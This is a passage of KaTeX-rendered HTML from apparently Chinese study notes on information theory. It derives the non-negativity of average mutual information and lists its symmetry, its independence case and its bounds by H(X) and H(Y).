style="margin-right:0.1667em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span><span style="top:-5.695em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span><span style="top:-2.3299em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span><span style="top:1.1339em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.4616em;"><span></span></span></span></span></span></span></span></span></span></span></span></p></li><li><p>当 X Y 独立的时候，共享的信息为 0，平均互信息量为 0.</p></li><li><p>共享的信息，无论从 X 的角度还是从 Y 的角度，都是相等的</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mo separator="true">;</mo><mi>X</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>I</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">I\left( Y;X \right) =I\left( X;Y \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p></li><li><p>共享的信息量不可能超过信源本身，也就是极值性。当 X 和 Y 一一对应就是无损的信道：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>≤</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo fence="true">)</mo></mrow><mspace linebreak="newline"></mspace><mi>I</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>≤</mo><mi>H</mi><mrow><mo fence="true">(</mo><mi>Y</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">  I\left( X;Y \right) \le H\left( X \right)  \\  I\left( X;Y \right) \le H\left( Y \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p></li><li><p>平均互信息量是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span> 的上凸用函数，<span class="katex"><span class="katex-mathml"><math 